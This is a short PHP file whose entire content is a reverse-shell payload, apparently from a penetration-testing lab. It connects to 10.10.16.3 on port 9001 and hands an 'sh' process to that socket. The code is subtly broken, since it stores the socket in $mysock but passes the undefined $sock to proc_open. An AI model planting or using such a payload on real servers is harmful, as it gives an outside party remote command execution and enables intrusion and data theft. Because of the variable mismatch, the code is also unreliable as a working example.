<?php
$mysock=fsockopen("10.10.16.3",9001);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
